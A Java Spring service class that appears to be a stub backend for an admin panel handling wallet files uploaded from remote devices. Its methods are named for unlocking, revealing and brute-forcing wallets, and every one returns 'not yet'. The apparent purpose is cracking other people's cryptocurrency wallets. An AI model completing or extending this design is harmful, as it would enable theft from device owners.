package com.admin.service;

import java.util.LinkedHashMap;
import java.util.Map;

import org.springframework.stereotype.Service;

import com.admin.auth.AdminContext;
import com.admin.dao.UploadFileDao;
import com.admin.entity.DeviceEntity;
import com.admin.entity.UploadFileEntity;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;

@Service
@RequiredArgsConstructor
public class WalletStubService {

    private final DeviceAdminService deviceAdminService;
    private final UploadFileDao uploadFileDao;
    private final SecretRevealService secretRevealService;

    public Map<String, Object> unlock(AdminContext ctx, String deviceId, String fileName, String password) {
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        UploadFileEntity file = findFile(d.getDeviceId(), fileName);
        if (file == null) {
            return fail("need archive");
        }
        return fail("not yet / need archive");
    }

    public Map<String, Object> revealWallet(AdminContext ctx, String deviceId, String fileName, String password) {
        String pwErr = secretRevealService.checkViewPassword(password);
        if (pwErr != null) {
            return fail(pwErr);
        }
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        if (findFile(d.getDeviceId(), fileName) == null) {
            return fail("need archive");
        }
        return fail("not yet / need archive");
    }

    public Map<String, Object> revealNote(AdminContext ctx, String deviceId, String fileName, Integer noteIndex, String password) {
        String pwErr = secretRevealService.checkViewPassword(password);
        if (pwErr != null) {
            return fail(pwErr);
        }
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        if (findFile(d.getDeviceId(), fileName) == null) {
            return fail("need archive");
        }
        Map<String, Object> m = fail("not yet / need archive");
        m.put("noteIndex", noteIndex);
        return m;
    }

    public Map<String, Object> bruteStart(AdminContext ctx, String deviceId, String fileName) {
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        if (findFile(d.getDeviceId(), fileName) == null) {
            return fail("need archive");
        }
        return fail("not yet / need archive");
    }

    public Map<String, Object> bruteStatus(AdminContext ctx, String deviceId, String jobId) {
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        Map<String, Object> m = fail("任务不存在或已过期");
        m.put("jobId", jobId);
        return m;
    }

    public Map<String, Object> bruteOrder(AdminContext ctx, String deviceId, String wallet, String pkg) {
        DeviceEntity d = deviceAdminService.loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return fail("设备不存在或无权访问");
        }
        Map<String, Object> m = fail("not yet");
        m.put("wallet", wallet);
        m.put("package", pkg);
        return m;
    }

    private UploadFileEntity findFile(String deviceId, String fileName) {
        if (fileName == null || fileName.isBlank()) {
            return null;
        }
        return uploadFileDao.selectOne(new QueryWrapper<UploadFileEntity>()
                .eq("deviceId", deviceId)
                .eq("fileName", fileName.trim())
                .orderByDesc("id")
                .last("LIMIT 1"));
    }

    private Map<String, Object> fail(String error) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("ok", false);
        m.put("error", error);
        return m;
    }
}
